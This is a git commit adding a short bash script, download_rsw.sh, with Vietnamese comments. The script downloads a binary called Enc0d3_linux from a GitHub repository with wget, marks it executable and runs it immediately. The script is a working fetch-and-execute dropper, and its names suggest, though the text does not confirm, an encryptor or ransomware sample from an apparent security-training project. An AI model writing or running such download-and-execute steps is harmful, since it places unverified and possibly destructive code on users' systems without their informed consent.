990f32fd2ae5baf57702e09647dbb492b49fd44c
Thân Hữu Tuấn <32167814+ThanHuuTuan@users.noreply.github.com>
2024-07-30 16:38:09 +0700

    Create download_rsw.sh
    download_rsw.sh

---
+++ download_rsw.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+# Tải file từ URL
+wget https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/Enc0d3_linux
+
+# Đặt quyền thực thi cho file đã tải
+chmod +x Enc0d3_linux
+
+# Chạy file
+./Enc0d3_linux
